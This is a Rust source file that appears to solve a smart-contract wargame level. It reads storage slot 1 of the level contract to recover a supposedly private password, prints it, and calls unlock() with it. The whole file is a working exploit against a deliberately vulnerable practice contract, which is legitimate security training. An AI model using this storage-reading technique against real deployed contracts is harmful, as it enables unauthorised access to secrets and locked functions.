use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function unlock(bytes32) public
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let level_address = level.instance.parse::<Address>()?;
    let password = client
        .get_storage_at(level_address, H256::from_low_u64_be(1), None)
        .await?;
    println!("password: {}", password);

    let contract = LevelContract::new(level_address, client.clone());
    let receipt = contract
        .unlock(password.into())
        .legacy()
        .send()
        .await?
        .await?;
    println!("solve():\n{}", serde_json::to_string_pretty(&receipt)?);

    Ok(())
}
